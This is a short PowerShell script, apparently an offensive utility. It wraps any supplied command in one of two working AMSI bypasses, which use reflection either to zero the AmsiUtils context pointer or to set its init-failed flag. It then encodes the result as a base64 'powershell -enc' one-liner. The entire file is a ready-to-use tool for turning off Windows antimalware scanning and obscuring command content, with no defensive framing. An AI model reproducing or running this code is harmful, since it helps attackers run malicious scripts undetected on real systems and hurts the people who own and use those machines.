param(
  [string]$amsi,
  [string]$c
)

if ($amsi -like 'context')
{
  $bypass = 'foreach($i in [Ref].Assembly.GetTypes()){if($i.Name -like "*iUtils"){$t=$i}};foreach($j in $t.GetFields("NonPublic,Static")){if($j.Name -like "*Context"){$f=$j}}; [IntPtr]$ctx=$f.GetValue($null); [Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ctx, 1); ' 
}

if ($amsi -like 'init')
{
  $bypass = 'foreach($i in [Ref].Assembly.GetTypes()){if($i.Name -like "*iUtils"){$t=$i}};foreach($j in $t.GetFields("NonPublic,Static")){if($j.Name -like "*Init*"){$f=$j}}; $f.setValue($null,$true); '
}
if ($amsi)
{
  $payload = $bypass + $c 
} else
{
  $payload = $c
}
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
write-output "powershell -enc $enc"  






